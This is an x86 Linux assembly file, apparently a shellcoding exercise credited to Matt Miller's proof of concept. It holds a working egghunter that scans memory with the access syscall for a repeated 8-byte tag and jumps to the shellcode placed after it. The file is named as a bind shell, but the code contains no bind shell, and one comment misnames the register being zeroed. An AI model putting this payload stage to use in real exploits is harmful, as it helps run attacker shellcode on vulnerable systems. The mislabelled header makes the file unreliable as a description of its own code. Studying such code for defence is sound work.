; bind_shell.nasm
; Author: Bo Pearce
; PoC taken from Matt Miller

global _start

section .text
_start: 
	mov ebx,0x50905090 ;our egg
	xor ecx, ecx ; zer edx
	mul ecx ;Doubleword	EAX	r/m32	EDX:EAX zeros eax and edx

inc_page:
	or dx, 0xfff ;4095
inc_mem:
	inc edx ;add 1 gives 4096 which is PAGE_SIZE
	pusha ;push registers
	lea ebx, [edx + 0x4]
	mov al, 0x21 ;access for soft-int on next instruction
	int 0x80

	cmp al, 0xf2 ;cmp if return value is equal to EFAULT (invalid memory)
	popa ;restore registers

	jz inc_page ;if invalid go to inc_page
	cmp [edx], ebx ;check if first 4 bytes are equal to egg
	jnz inc_mem ;if not go to inc_me
	cmp [edx + 0x4], ebx ;check if next 4 bytes are equal to egg
	jnz inc_mem ;if not go to inc_mem
	jmp edx ;if all 8 bytes are equal to egg we found our shell code so jmp to it
